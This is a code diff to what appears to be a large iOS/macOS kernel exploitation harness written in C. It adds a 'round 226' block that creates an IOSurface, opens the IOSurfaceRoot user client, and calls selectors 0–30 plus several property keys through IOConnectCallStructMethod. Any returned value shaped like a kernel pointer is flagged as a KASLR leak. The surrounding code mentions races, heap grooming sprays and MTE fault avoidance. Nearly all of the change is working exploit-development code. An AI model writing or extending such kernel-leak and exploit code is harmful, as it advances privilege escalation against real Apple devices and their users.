@@ -20252,7 +20252,7 @@ new_modes:
          */
         if (rounds >= 170 && rounds != 219 && rounds != 225) {
             rlog("\n--- Phase 17: IOSurface shared memory + KASLR probe ---\n");
-            if (rounds >= 220 && rounds <= 224) goto r220_block;
+            if ((rounds >= 220 && rounds <= 224) || rounds == 226) goto r220_block;
 
             dispatch_after(dispatch_time(DISPATCH_TIME_NOW, 60 * NSEC_PER_SEC),
                 dispatch_get_global_queue(0, 0), ^{
@@ -26588,6 +26588,165 @@ new_modes:
              * This avoids MTE tag faults because the reclaim allocates a fresh
              * entry with valid MTE tags.
              */
+            if (rounds == 226) {
+                rlog("\n=== r=226: IOSurface object layout probe via shared memory ===\n");
+
+                io_service_t svc226 = IOServiceGetMatchingService(kIOMasterPortDefault,
+                    IOServiceMatching("IOSurfaceRoot"));
+                if (!svc226) { rlog("  NO IOSurfaceRoot!\n"); goto phase17_done; }
+
+                /* Create probe surface with shared memory */
+                CFMutableDictionaryRef sp226 = CFDictionaryCreateMutable(NULL, 0,
+                    &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+                int w226 = 256, h226 = 256, bpe226 = 4, bpr226 = w226 * bpe226;
+                CFNumberRef wn226 = CFNumberCreate(NULL, kCFNumberIntType, &w226);
+                CFNumberRef hn226 = CFNumberCreate(NULL, kCFNumberIntType, &h226);
+                CFNumberRef bn226 = CFNumberCreate(NULL, kCFNumberIntType, &bpe226);
+                CFNumberRef rn226 = CFNumberCreate(NULL, kCFNumberIntType, &bpr226);
+                int pf226 = 0x42475241;
+                CFNumberRef pfn226 = CFNumberCreate(NULL, kCFNumberIntType, &pf226);
+                CFDictionarySetValue(sp226, CFSTR("IOSurfaceWidth"), wn226);
+                CFDictionarySetValue(sp226, CFSTR("IOSurfaceHeight"), hn226);
+                CFDictionarySetValue(sp226, CFSTR("IOSurfaceBytesPerElement"), bn226);
+                CFDictionarySetValue(sp226, CFSTR("IOSurfaceBytesPerRow"), rn226);
+                CFDictionarySetValue(sp226, CFSTR("IOSurfacePixelFormat"), pfn226);
+
+                IOSurfaceRef probe = IOSurfaceCreate(sp226);
+                if (!probe) { rlog("  Failed to create probe surface\n"); goto p226_cleanup; }
+                uint32_t surfID = IOSurfaceGetID(probe);
+                size_t allocSz = IOSurfaceGetAllocSize(probe);
+                rlog("  Probe surface ID=%u allocSz=%zu\n", surfID, allocSz);
+
+                /* Lock and get base address (shared memory mapping) */
+                IOSurfaceLock(probe, 0, NULL);
+                void *base = IOSurfaceGetBaseAddress(probe);
+                rlog("  Shared memory base: %p\n", base);
+
+                /* Write patterns for detection */
+                if (base) {
+                    memset(base, 0x41, allocSz > 4096 ? 4096 : allocSz);
+                    uint64_t *bp = (uint64_t *)base;
+                    for (int i = 0; i < 64; i++) bp[i] = 0xBEEF226000000000ULL | i;
+                }
+                IOSurfaceUnlock(probe, 0, NULL);
+
+                /* Probe all getters that might leak kernel addresses */
+                rlog("  Surface properties:\n");
+                rlog("    Width=%zu Height=%zu BPE=%zu BPR=%zu\n",
+                    IOSurfaceGetWidth(probe), IOSurfaceGetHeight(probe),
+                    IOSurfaceGetBytesPerElement(probe), IOSurfaceGetBytesPerRow(probe));
+                rlog("    PlaneCount=%zu Seed=%u\n",
+                    IOSurfaceGetPlaneCount(probe), IOSurfaceGetSeed(probe));
+
+                /* Try known property keys that might leak addresses */
+                const char *probe_keys[] = {
+                    "IOSurfaceAddress", "IOSurfaceAllocSize",
+                    "IOSurfaceIsGlobal", "IOSurfaceCacheMode",
+                    "IOSurfaceOffset", "IOSurfaceSize",
+                    "IOSurfaceBaseOffset", "IOSurfacePlaneBase",
+                    "IOSurfacePlaneOffset", "IOSurfacePlaneBytesPerRow",
+                    "IOSurfaceElementWidth", "IOSurfaceElementHeight",
+                    NULL
+                };
+
+                io_connect_t pc226 = IO_OBJECT_NULL;
+                IOServiceOpen(svc226, mach_task_self(), 0, &pc226);
+                if (pc226) {
+                    for (int ki = 0; probe_keys[ki]; ki++) {
+                        /* Try getValue via selector 10 */
+                        uint8_t inbuf[256]; memset(inbuf, 0, sizeof(inbuf));
+                        uint32_t *kin = (uint32_t *)inbuf;
+                        kin[0] = surfID;
+                        size_t klen = strlen(probe_keys[ki]);
+                        kin[1] = (uint32_t)klen;
+                        memcpy(inbuf + 8, probe_keys[ki], klen);
+                        uint8_t outbuf[256]; memset(outbuf, 0, sizeof(outbuf));
+                        size_t outsz = sizeof(outbuf);
+                        kern_return_t kr = IOConnectCallStructMethod(pc226, 10, inbuf,
+                            8 + klen, outbuf, &outsz);
+                        if (kr == KERN_SUCCESS && outsz > 0) {
+                            uint64_t *ov = (uint64_t *)outbuf;
+                            rlog("    key='%s' outsz=%zu val=0x%llx",
+                                probe_keys[ki], outsz, (unsigned long long)ov[0]);
+                            if (outsz >= 16) rlog(" [1]=0x%llx", (unsigned long long)ov[1]);
+                            rlog("\n");
+                            /* Check if it looks like a kernel pointer */
+                            if ((ov[0] & 0xFFFFFF0000000000ULL) == 0xFFFFFE0000000000ULL)
+                                rlog("    *** KERNEL POINTER LEAK: 0x%llx ***\n",
+                                    (unsigned long long)ov[0]);
+                        }
+                    }
+
+                    /* Probe selectors 0-30 with surface ID as input */
+                    rlog("  Probing selectors 0-30 for output data:\n");
+                    for (int sel = 0; sel <= 30; sel++) {
+                        if (sel == 17 || sel == 18) continue;
+                        uint8_t si[64]; memset(si, 0, sizeof(si));
+                        uint64_t *sip = (uint64_t *)si;
+                        sip[0] = surfID;
+                        sip[1] = 0;
+                        sip[2] = 0;
+                        uint8_t so[256]; memset(so, 0, sizeof(so));
+                        size_t sos = sizeof(so);
+                        kern_return_t kr = IOConnectCallStructMethod(pc226, sel, si, 24, so, &sos);
+                        if (kr == KERN_SUCCESS && sos > 0) {
+                            uint64_t *sov = (uint64_t *)so;
+                            int has_ptr = 0;
+                            for (size_t bi = 0; bi < sos / 8; bi++)
+                                if ((sov[bi] & 0xFFFFFF0000000000ULL) == 0xFFFFFE0000000000ULL)
+                                    has_ptr = 1;
+                            if (has_ptr || sel < 15)
+                                rlog("    sel%d: outsz=%zu [0]=0x%llx [1]=0x%llx%s\n",
+                                    sel, sos, (unsigned long long)sov[0],
+                                    sos >= 16 ? (unsigned long long)sov[1] : 0ULL,
+                                    has_ptr ? " *** HAS KERNEL PTR ***" : "");
+                        }
+                    }
+                    IOServiceClose(pc226);
+                }
+
+                /* Try to find kernel address via IORegistryEntry properties */
+                io_connect_t rc226 = IO_OBJECT_NULL;
+                IOServiceOpen(svc226, mach_task_self(), 0, &rc226);
+                if (rc226) {
+                    /* Register for notification on our probe surface, then read the entry */
+                    mach_port_t wp226 = MACH_PORT_NULL;
+                    mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &wp226);
+                    mach_port_insert_right(mach_task_self(), wp226, wp226, MACH_MSG_TYPE_MAKE_SEND);
+                    uint64_t ref226 = 0x1226226226226226ULL;
+                    uint64_t inp226[3] = {surfID, 0xAAAA, 0xBBBB};
+                    kern_return_t kr = IOConnectCallAsyncMethod(rc226, 17, wp226, &ref226, 1,
+                        NULL, 0, inp226, 24, NULL, NULL, NULL, NULL);
+                    rlog("  sel17 register: 0x%x (surface=%u)\n", kr, surfID);
+
+                    /* Now read back via sel10 with the surface ID */
+                    uint8_t gbuf[256]; memset(gbuf, 0, sizeof(gbuf));
+                    uint32_t *gin = (uint32_t *)gbuf;
+                    gin[0] = surfID;
+                    size_t gos = sizeof(gbuf);
+                    kr = IOConnectCallStructMethod(rc226, 11, gbuf, 4, gbuf, &gos);
+                    rlog("  sel11 (lookup by ID): 0x%x outsz=%zu\n", kr, gos);
+                    if (kr == KERN_SUCCESS && gos >= 8) {
+                        uint64_t *gv = (uint64_t *)gbuf;
+                        for (size_t i = 0; i < gos / 8 && i < 8; i++)
+                            rlog("    [%zu]=0x%llx%s\n", i, (unsigned long long)gv[i],
+                                (gv[i] & 0xFFFFFF0000000000ULL) == 0xFFFFFE0000000000ULL
+                                    ? " *** KERNEL PTR ***" : "");
+                    }
+
+                    IOServiceClose(rc226);
+                    mach_port_deallocate(mach_task_self(), wp226);
+                }
+
+                p226_cleanup:
+                if (probe) CFRelease(probe);
+                CFRelease(wn226); CFRelease(hn226); CFRelease(bn226); CFRelease(rn226); CFRelease(pfn226);
+                CFRelease(sp226);
+                IOObjectRelease(svc226);
+                rlog("=== r=226 complete ===\n");
+                goto phase17_done;
+            }
+
             if (rounds == 224) {
                 rlog("\n=== r=224: Full-scale race WITH groom spray ===\n");
 
